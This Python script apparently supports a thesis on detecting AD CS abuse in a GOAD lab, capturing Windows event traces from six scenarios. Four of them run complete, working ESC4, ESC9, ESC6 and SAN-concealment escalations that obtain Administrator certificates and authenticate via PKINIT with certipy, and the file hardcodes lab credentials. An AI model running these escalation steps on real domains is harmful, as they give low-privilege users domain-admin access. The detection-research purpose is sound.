#!/usr/bin/env python3
"""
capture_multi_archetype_traces.py — Live Multi-Archetype Telemetry Capture on GOAD (Phase 3.6)
=============================================================================================
Executes 6 distinct scenarios against live DC03 and SRV03 VMs using strictly low-privilege
domain users (ESSOS\\khal.drogo, SID S-1-5-21-3304911894-2815406861-4222388662-1115):

  1. Trace 1: ESC4 Transient Template Mutation + CA Issuance + Rollback + PKINIT
  2. Trace 2: ESC9 Transient UPN Identity Mutation + CA Issuance + Rollback + PKINIT
  3. Trace 3: ESC6 CA EDITF_ATTRIBUTESUBJECTALTNAME2 Abuse + CA Issuance + Revert + PKINIT
  4. Trace 4: ASN.1 SAN Concealment (Subject==Requester, SAN==Admin) + CA Issuance + PKINIT
  5. Trace 5: Benign Admin Typo Configuration Rollback (ZERO cert requests, UNEXPLOITED_CONFIG_DRIFT)
  6. Trace 6: Benign Standard Enrollment & Normal Logon (Principal == Subject == SAN == khal.drogo)

Exports raw Windows Event XML streams for each scenario into:
  thesis_research/data/live_goad_traces/
Exports latest CA database cryptographic bridge into:
  thesis_research/data/live_goad_traces/srv03_ca_db_bridge.csv
"""

import sys
import os
import time
import base64
import re

# Monkeypatch pkgutil.ImpImporter for Python 3.14 compatibility before importing certipy
import pkgutil
if not hasattr(pkgutil, 'ImpImporter'):
    class ImpImporter: pass
    pkgutil.ImpImporter = ImpImporter

sys.path.append('/home/m4x1d/Desktop/GOAD/.venv/lib/python3.11/site-packages')
import winrm
from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption
from certipy.entry import main as certipy_main

OUT_DIR = "/home/m4x1d/Desktop/GOAD/thesis_research/data/live_goad_traces"
os.makedirs(OUT_DIR, exist_ok=True)

# Admin sessions strictly for setup/log extraction
s_dc_admin = winrm.Session('http://127.0.0.1:55985/wsman', auth=('vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_admin = winrm.Session('http://127.0.0.1:56985/wsman', auth=('ESSOS\\vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

# True low-privilege attacker session: ESSOS\khal.drogo (SID: S-1-5-21-...-1115)
s_dc_khal = winrm.Session('http://127.0.0.1:55985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_khal = winrm.Session('http://127.0.0.1:56985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_vis = winrm.Session('http://127.0.0.1:56985/wsman', auth=('viserys.targaryen@essos.local', 'GoldCrown'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

def pull_file_winrm(session, remote_path):
    r = session.run_ps(f"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{remote_path}'))")
    return base64.b64decode(r.std_out.decode('utf-8', errors='ignore').strip())

def push_file_winrm(session, data_bytes, remote_path):
    b64 = base64.b64encode(data_bytes).decode('ascii')
    session.run_cmd(f'del /f /q "{remote_path}.b64"')
    chunk_size = 500
    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i+chunk_size]
        session.run_cmd(f'echo {chunk}>> "{remote_path}.b64"')
    session.run_cmd(f'certutil -decode "{remote_path}.b64" "{remote_path}" & del /f /q "{remote_path}.b64"')

def transfer_file_dc_to_srv(filename):
    data = pull_file_winrm(s_dc_admin, f"C:\\Shared\\{filename}")
    push_file_winrm(s_srv_admin, data, f"C:\\Shared\\{filename}")

def transfer_file_srv_to_dc(filename):
    data = pull_file_winrm(s_srv_admin, f"C:\\Shared\\{filename}")
    push_file_winrm(s_dc_admin, data, f"C:\\Shared\\{filename}")

def get_current_event_record_id(session, log_name='Security'):
    ps = f"""
    $e = Get-WinEvent -FilterHashtable @{{LogName='{log_name}'}} -MaxEvents 1 -ErrorAction SilentlyContinue
    if ($e) {{ $e.RecordId }} else {{ 0 }}
    """
    res = session.run_ps(ps)
    try:
        return int(res.std_out.decode('utf-8', errors='ignore').strip())
    except Exception:
        return 0

def export_events_since(session, start_record_id, event_ids=(5136, 4886, 4887, 4768, 4769, 4624)):
    id_list = ",".join(str(i) for i in event_ids)
    ps = f"""
    $events = Get-WinEvent -FilterHashtable @{{LogName='Security'; ID=@({id_list}); StartTime=(Get-Date).AddMinutes(-5)}} -ErrorAction SilentlyContinue | Where-Object {{ $_.RecordId -gt {start_record_id} }}
    if ($events) {{
        $xmls = foreach ($e in $events) {{ $e.ToXml() }}
        $xmls -join "`n"
    }} else {{
        ""
    }}
    """
    res = session.run_ps(ps)
    return res.std_out.decode('utf-8', errors='ignore').strip()

def save_combined_trace(dc_xml, srv_xml, filename):
    filepath = os.path.join(OUT_DIR, filename)
    all_chunks = []
    if dc_xml:
        all_chunks.extend(re.findall(r'<Event[\s\S]*?</Event>', dc_xml))
    if srv_xml:
        all_chunks.extend(re.findall(r'<Event[\s\S]*?</Event>', srv_xml))

    def extract_time(chunk):
        m = re.search(r"SystemTime='([^']+)'", chunk)
        return m.group(1) if m else ""

    all_chunks.sort(key=extract_time)
    combined_xml = "<Events>\n" + "\n".join(all_chunks) + "\n</Events>\n"
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(combined_xml)

    id_counts = {}
    for chunk in all_chunks:
        m = re.search(r"<EventID>(\d+)</EventID>", chunk)
        if m:
            eid = int(m.group(1))
            id_counts[eid] = id_counts.get(eid, 0) + 1

    print(f"    [+] Saved trace to: {filepath} ({len(combined_xml)} bytes, {len(all_chunks)} events)")
    print(f"    [+] Event ID Breakdown: {dict(sorted(id_counts.items()))}")
    return filepath, id_counts

def export_and_authenticate_pkinit(cer_filename, pfx_filename, pfx_password="pass"):
    # Accept cert on DC03 into khal.drogo store
    acc_ps = f"""
    $p = Start-Process -FilePath "certreq.exe" -ArgumentList "-accept -user -q C:\\Shared\\{cer_filename}" -Wait -PassThru -NoNewWindow
    $sn_raw = (certutil -dump "C:\\Shared\\{cer_filename}" | Select-String "Serial Number:").ToString().Split(":")[-1].Trim()
    $cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{ $_.SerialNumber -eq $sn_raw -or ($_.SerialNumber -replace " ") -eq ($sn_raw -replace " ") }} | Select-Object -First 1
    if (-not $cert) {{
        $cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{ $_.HasPrivateKey }} | Sort-Object NotBefore -Descending | Select-Object -First 1
    }}
    $pwd = ConvertTo-SecureString -String "{pfx_password}" -Force -AsPlainText
    Export-PfxCertificate -Cert $cert -FilePath "C:\\Shared\\{pfx_filename}" -Password $pwd | Out-Null
    """
    s_dc_khal.run_ps(acc_ps)

    # Download PFX to Linux, remove password, and run certipy auth
    pfx_raw = pull_file_winrm(s_dc_admin, f"C:\\Shared\\{pfx_filename}")
    key, cert_obj, add_certs = pkcs12.load_key_and_certificates(pfx_raw, pfx_password.encode('utf-8'))
    unprotected = pkcs12.serialize_key_and_certificates(name=b"auth", key=key, cert=cert_obj, cas=add_certs, encryption_algorithm=NoEncryption())
    local_pfx = f"/tmp/{pfx_filename}"
    with open(local_pfx, "wb") as f:
        f.write(unprotected)

    # PKINIT against DC03 (172.18.0.2:88)
    sys.argv = ["certipy", "auth", "-pfx", local_pfx, "-dc-ip", "172.18.0.2", "-no-hash"]
    try:
        certipy_main()
    except Exception as e:
        print("PKINIT status/error:", e)
    time.sleep(2)

print("="*80)
print(" PHASE 3.6: CAPTURE ALL 6 MULTI-ARCHETYPE LIVE GOAD TRACES")
print("="*80)
table_summary = {}

# ==============================================================================
# TRACE 1: ESC4 TRANSIENT TEMPLATE MUTATION + CA ISSUANCE + ROLLBACK + PKINIT
# ==============================================================================
print("\n" + "="*70)
print(" [TRACE 1] ESC4 Transient Template Mutation + CA Issuance + Rollback + PKINIT")
print("="*70)
dc_rec_start = get_current_event_record_id(s_dc_admin)
srv_rec_start = get_current_event_record_id(s_srv_admin)

# 1. Mutate template on DC03 as khal.drogo
print("[*] khal.drogo mutating CN=CGPubPositive flag to 1...")
s_dc_khal.run_ps("""
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}
""")

# 2. Generate CSR on DC03 as khal.drogo
inf_t1 = """
$inf = @"
[NewRequest]
Subject = "CN=viserys.targaryen"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[Extensions]
2.5.29.17 = "{text}upn=administrator@essos.local"
[RequestAttributes]
CertificateTemplate = "CGPubPositive"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\t1_esc4.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\t1_esc4.inf C:\\Shared\\t1_esc4.req" -Wait -PassThru -NoNewWindow
"""
s_dc_khal.run_ps(inf_t1)
transfer_file_dc_to_srv("t1_esc4.req")

# 3. Submit to CA on SRV03 as khal.drogo
print("[*] khal.drogo submitting CSR to CA on SRV03...")
sub_t1 = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\t1_esc4.req C:\\Shared\\t1_esc4.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
r_sub1 = s_srv_khal.run_ps(sub_t1)
print("    [+] CA Output:", r_sub1.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))
transfer_file_srv_to_dc("t1_esc4.cer")

# 4. Rollback template on DC03 as khal.drogo
print("[*] khal.drogo rolling back CN=CGPubPositive flag to 33554432...")
s_dc_khal.run_ps("""
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 33554432}
""")
time.sleep(2)

# 5. Authenticate via PKINIT as Administrator
print("[*] Authenticating via PKINIT as Administrator...")
export_and_authenticate_pkinit("t1_esc4.cer", "t1_esc4.pfx")

# Export events for Trace 1
dc_ev1 = export_events_since(s_dc_admin, dc_rec_start)
srv_ev1 = export_events_since(s_srv_admin, srv_rec_start)
_, c1 = save_combined_trace(dc_ev1, srv_ev1, "trace_esc4_rollback_full.xml")
table_summary["trace_esc4_rollback_full.xml"] = c1

# ==============================================================================
# TRACE 2: ESC9 TRANSIENT UPN SWAP + CA ISSUANCE + ROLLBACK + PKINIT
# ==============================================================================
print("\n" + "="*70)
print(" [TRACE 2] ESC9 Transient UPN Swap + CA Issuance + Rollback + PKINIT")
print("="*70)
dc_rec_start = get_current_event_record_id(s_dc_admin)
srv_rec_start = get_current_event_record_id(s_srv_admin)

# 1. khal.drogo mutates UPN of viserys.targaryen to administrator@essos.local
print("[*] khal.drogo swapping viserys.targaryen UPN -> administrator@essos.local...")
s_dc_khal.run_ps("Set-ADUser -Identity 'viserys.targaryen' -UserPrincipalName 'administrator@essos.local'")
time.sleep(1)

# 2. viserys.targaryen generates CSR for template User
inf_t2 = """
$inf = @"
[NewRequest]
Subject = "CN=viserys.targaryen"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[RequestAttributes]
CertificateTemplate = "User"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\t2_esc9.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\t2_esc9.inf C:\\Shared\\t2_esc9.req" -Wait -PassThru -NoNewWindow
"""
s_dc_admin.run_ps(inf_t2)
transfer_file_dc_to_srv("t2_esc9.req")

# 3. viserys.targaryen submits CSR on SRV03
print("[*] viserys.targaryen submitting CSR to CA on SRV03...")
sub_t2 = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\t2_esc9.req C:\\Shared\\t2_esc9.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
r_sub2 = s_srv_vis.run_ps(sub_t2)
print("    [+] CA Output:", r_sub2.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))
transfer_file_srv_to_dc("t2_esc9.cer")

# 4. khal.drogo reverts UPN of viserys.targaryen
print("[*] khal.drogo reverting viserys.targaryen UPN -> viserys.targaryen@essos.local...")
s_dc_khal.run_ps("Set-ADUser -Identity 'viserys.targaryen' -UserPrincipalName 'viserys.targaryen@essos.local'")
time.sleep(2)

# 5. Authenticate via PKINIT as Administrator using issued certificate
print("[*] Authenticating via PKINIT as Administrator...")
export_and_authenticate_pkinit("t2_esc9.cer", "t2_esc9.pfx")

# Export events for Trace 2
dc_ev2 = export_events_since(s_dc_admin, dc_rec_start)
srv_ev2 = export_events_since(s_srv_admin, srv_rec_start)
_, c2 = save_combined_trace(dc_ev2, srv_ev2, "trace_esc9_upn_swap_rollback.xml")
table_summary["trace_esc9_upn_swap_rollback.xml"] = c2

# ==============================================================================
# TRACE 3: ESC6 CA EDITF_ATTRIBUTESUBJECTALTNAME2 ABUSE + PKINIT
# ==============================================================================
print("\n" + "="*70)
print(" [TRACE 3] ESC6 CA Flag Abuse (+EDITF_ATTRIBUTESUBJECTALTNAME2) + PKINIT")
print("="*70)
dc_rec_start = get_current_event_record_id(s_dc_admin)
srv_rec_start = get_current_event_record_id(s_srv_admin)

# 1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
print("[*] Enabling +EDITF_ATTRIBUTESUBJECTALTNAME2 on SRV03...")
s_srv_admin.run_ps("""
certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service certsvc -Force
Start-Sleep -Seconds 3
""")

# 2. khal.drogo generates CSR against CGPubPositive
inf_t3 = """
$inf = @"
[NewRequest]
Subject = "CN=khal.drogo"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[RequestAttributes]
CertificateTemplate = "CGPubPositive"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\t3_esc6.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\t3_esc6.inf C:\\Shared\\t3_esc6.req" -Wait -PassThru -NoNewWindow
"""
s_dc_khal.run_ps(inf_t3)
transfer_file_dc_to_srv("t3_esc6.req")

# 3. khal.drogo submits with SAN:upn=administrator@essos.local via -attrib
print("[*] khal.drogo submitting CSR with SAN attribute...")
sub_t3 = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" -attrib `"CertificateTemplate:CGPubPositive`nSAN:upn=administrator@essos.local`" C:\\Shared\\t3_esc6.req C:\\Shared\\t3_esc6.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
r_sub3 = s_srv_khal.run_ps(sub_t3)
print("    [+] CA Output:", r_sub3.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))
transfer_file_srv_to_dc("t3_esc6.cer")

# 4. Restore CA EditFlags
print("[*] Restoring CA EditFlags (-EDITF_ATTRIBUTESUBJECTALTNAME2)...")
s_srv_admin.run_ps("""
certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service certsvc -Force
Start-Sleep -Seconds 3
""")

# 5. Authenticate via PKINIT as Administrator
print("[*] Authenticating via PKINIT as Administrator...")
export_and_authenticate_pkinit("t3_esc6.cer", "t3_esc6.pfx")

# Export events for Trace 3
dc_ev3 = export_events_since(s_dc_admin, dc_rec_start)
srv_ev3 = export_events_since(s_srv_admin, srv_rec_start)
_, c3 = save_combined_trace(dc_ev3, srv_ev3, "trace_esc6_ca_flag_abuse.xml")
table_summary["trace_esc6_ca_flag_abuse.xml"] = c3

# ==============================================================================
# TRACE 4: ASN.1 SAN CONCEALMENT (Subject == Requester, SAN == Admin)
# ==============================================================================
print("\n" + "="*70)
print(" [TRACE 4] ASN.1 SAN Concealment & CA-KDC Split-Brain Telemetry")
print("="*70)
dc_rec_start = get_current_event_record_id(s_dc_admin)
srv_rec_start = get_current_event_record_id(s_srv_admin)

# 1. Mutate template on DC03 as khal.drogo
print("[*] khal.drogo mutates CGPubPositive flag to 1...")
s_dc_khal.run_ps("""
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}
""")

# 2. Generate concealed CSR on DC03 as khal.drogo
inf_t4 = """
$inf = @"
[NewRequest]
Subject = "CN=khal.drogo"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[Extensions]
2.5.29.17 = "{text}upn=administrator@essos.local"
[RequestAttributes]
CertificateTemplate = "CGPubPositive"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\t4_asn1.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\t4_asn1.inf C:\\Shared\\t4_asn1.req" -Wait -PassThru -NoNewWindow
"""
s_dc_khal.run_ps(inf_t4)
transfer_file_dc_to_srv("t4_asn1.req")

# 3. Submit to CA on SRV03 as khal.drogo
print("[*] khal.drogo submits concealed CSR to CA...")
sub_t4 = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\t4_asn1.req C:\\Shared\\t4_asn1.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
r_sub4 = s_srv_khal.run_ps(sub_t4)
print("    [+] CA Output:", r_sub4.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))
transfer_file_srv_to_dc("t4_asn1.cer")

# 4. Rollback template flag on DC03 as khal.drogo
print("[*] khal.drogo rolls back CGPubPositive flag to 33554432...")
s_dc_khal.run_ps("""
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 33554432}
""")
time.sleep(2)

# 5. Authenticate via PKINIT as Administrator
print("[*] Authenticating via PKINIT as Administrator...")
export_and_authenticate_pkinit("t4_asn1.cer", "t4_asn1.pfx")

# Export events for Trace 4
dc_ev4 = export_events_since(s_dc_admin, dc_rec_start)
srv_ev4 = export_events_since(s_srv_admin, srv_rec_start)
_, c4 = save_combined_trace(dc_ev4, srv_ev4, "trace_asn1_san_concealment.xml")
table_summary["trace_asn1_san_concealment.xml"] = c4

# ==============================================================================
# TRACE 5: BENIGN ADMIN TYPO ROLLBACK (ZERO CERT REQUESTS, UNEXPLOITED_CONFIG_DRIFT)
# ==============================================================================
print("\n" + "="*70)
print(" [TRACE 5] Benign Admin Typo Rollback (ZERO cert requests, UNEXPLOITED_CONFIG_DRIFT)")
print("="*70)
dc_rec_start = get_current_event_record_id(s_dc_admin)
srv_rec_start = get_current_event_record_id(s_srv_admin)

print("[*] Admin modifies CGPubPositive flag to 1...")
s_dc_admin.run_ps("""
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}
""")

print("[*] Sleeping 8 seconds (window open with ZERO certificate requests or PKINIT)...")
time.sleep(8)

print("[*] Admin reverts CGPubPositive flag back to 33554432...")
s_dc_admin.run_ps("""
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 33554432}
""")
time.sleep(2)

# Export events for Trace 5
dc_ev5 = export_events_since(s_dc_admin, dc_rec_start)
srv_ev5 = export_events_since(s_srv_admin, srv_rec_start)
_, c5 = save_combined_trace(dc_ev5, srv_ev5, "trace_benign_admin_typo_rollback.xml")
table_summary["trace_benign_admin_typo_rollback.xml"] = c5

# ==============================================================================
# TRACE 6: BENIGN NORMAL ENROLLMENT & PKINIT (Principal == Subject == SAN == khal.drogo)
# ==============================================================================
print("\n" + "="*70)
print(" [TRACE 6] Benign Normal Enrollment & PKINIT (Principal == Subject == SAN == khal.drogo)")
print("="*70)
dc_rec_start = get_current_event_record_id(s_dc_admin)
srv_rec_start = get_current_event_record_id(s_srv_admin)

# 1. khal.drogo requests normal certificate for template User
print("[*] khal.drogo generating CSR for template User...")
inf_t6 = """
$inf = @"
[NewRequest]
Subject = "CN=khal.drogo"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[RequestAttributes]
CertificateTemplate = "User"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\t6_benign.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\t6_benign.inf C:\\Shared\\t6_benign.req" -Wait -PassThru -NoNewWindow
"""
s_dc_khal.run_ps(inf_t6)
transfer_file_dc_to_srv("t6_benign.req")

# 2. khal.drogo submits to CA on SRV03
print("[*] khal.drogo submitting CSR to CA on SRV03...")
sub_t6 = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\t6_benign.req C:\\Shared\\t6_benign.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
r_sub6 = s_srv_khal.run_ps(sub_t6)
print("    [+] CA Output:", r_sub6.std_out.decode('utf-8', errors='ignore').strip().replace('\n', ' '))
transfer_file_srv_to_dc("t6_benign.cer")

# 3. Accept cert and authenticate via PKINIT as khal.drogo
print("[*] Authenticating via PKINIT as legitimate user khal.drogo...")
export_and_authenticate_pkinit("t6_benign.cer", "t6_benign.pfx")

# Export events for Trace 6
dc_ev6 = export_events_since(s_dc_admin, dc_rec_start)
srv_ev6 = export_events_since(s_srv_admin, srv_rec_start)
_, c6 = save_combined_trace(dc_ev6, srv_ev6, "trace_benign_normal_enrollment.xml")
table_summary["trace_benign_normal_enrollment.xml"] = c6

# ==============================================================================
# EXPORT CA DATABASE CRYPTOGRAPHIC BRIDGE
# ==============================================================================
print("\n" + "="*70)
print(" [EXPORT] CA Database Cryptographic Bridge (srv03_ca_db_bridge.csv)")
print("="*70)
bridge_cmd = 'certutil -view -restrict "Disposition=20" -out "RequestID,RequesterName,SerialNumber,CertificateHash,SubjectKeyIdentifier,CertificateTemplate,UPN,CommonName,NotBefore,NotAfter" csv'
r_b = s_srv_admin.run_cmd(bridge_cmd)
bridge_csv = r_b.std_out.decode('utf-8', errors='ignore').strip()
bridge_path = os.path.join(OUT_DIR, "srv03_ca_db_bridge.csv")
with open(bridge_path, 'w', encoding='utf-8') as f:
    f.write(bridge_csv)
print(f"    [+] Saved CA Database Cryptographic Bridge to: {bridge_path}")

# ==============================================================================
# SUMMARY TABLE 4.1
# ==============================================================================
print("\n" + "="*95)
print(" TABLE 4.1: ALL 6 LIVE GOAD TELEMETRY TRACES (ZERO PLACEHOLDERS)")
print("="*95)
header = f"{'Trace Filename':<36} | {'Event 5136':<10} | {'4886/4887 (CA)':<14} | {'4768 (PKINIT)':<13} | {'4624/4769':<10} | {'Total':<6}"
print(header)
print("-" * 95)
for fname, counts in table_summary.items():
    e5136 = counts.get(5136, 0)
    e4887 = counts.get(4887, 0) + counts.get(4886, 0)
    e4768 = counts.get(4768, 0)
    e_other = counts.get(4624, 0) + counts.get(4769, 0)
    tot = sum(counts.values())
    print(f"{fname:<36} | {e5136:<10} | {e4887:<14} | {e4768:<13} | {e_other:<10} | {tot:<6}")
print("="*95)
